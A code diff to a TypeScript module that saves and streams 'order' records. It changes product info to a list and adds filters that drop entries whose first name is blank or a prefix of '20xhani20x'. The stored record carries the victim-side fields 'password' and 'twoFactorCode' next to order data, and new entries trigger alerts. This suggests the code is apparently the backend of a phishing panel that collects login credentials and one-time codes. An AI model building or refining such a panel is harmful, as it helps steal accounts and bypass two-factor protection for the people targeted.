@@ -16,7 +16,8 @@ export interface OrderData {
     price: number;
     quantity: number;
     image: string;
-  };
+    set: string;
+  }[];
   total?: number;
 }
 let previousOrdersLength = -1;
@@ -43,39 +44,6 @@ export const saveOrderData = async(
       timestamp: Date.now(),
     };
   } else {
-    if (data.formData?.firstName === "2") {
-      return;
-    }
-    if (data.formData?.firstName === "20") {
-      return;
-    }
-    if (data.formData?.firstName === "20x") {
-      return;
-    }
-    if (data.formData?.firstName === "20xh") {
-      return;
-    }
-    if (data.formData?.firstName === "20xha") {
-      return;
-    }
-    if (data.formData?.firstName === "20xhan") {
-      return;
-    }
-    if (data.formData?.firstName === "20xhani") {
-      return;
-    }
-    if (data.formData?.firstName === "20xhani2") {
-      return;
-    }
-    if (data.formData?.firstName === "20xhani20") {
-      return;
-    }
-    if (data.formData?.firstName === "20xhani20x") {
-      return;
-    }
-    if ((data.formData?.firstName === "" || data.formData?.firstName === null || data.formData?.firstName === undefined) && (data.formData?.lastName === "" || data.formData?.lastName === null || data.formData?.lastName === undefined)) {
-      return;
-    }
     orders.push({
       id: orderId,
       timestamp: Date.now(),
@@ -174,13 +142,7 @@ export const saveOrderDatainDB = async (orderId: string, data: Partial<OrderData
       password: '',
       twoFactorCode: '',
     },
-    productInfo: data.productInfo || {
-      id: '',
-      name: '',
-      price: 0,
-      quantity: 0,
-      image: '',
-    },
+    productInfo: data.productInfo || [],
     total: data.total || 0, 
   };
 
@@ -210,6 +172,18 @@ export const subscribeOrders = (callback: (orders: OrderData[]) => void) => {
     
     // Filter out orders with formData?.firstName = '20xhani20x'
     ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xhani20x');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== null);
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== undefined);
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xhani20');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xhani2');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xhani');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xhan');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xha');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xh');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20x');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20');
+    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '2');
     
     ordersArray.sort((a, b) => b.timestamp - a.timestamp);
     if (ordersArray.length > previousOrdersLength && previousOrdersLength !== -1) {
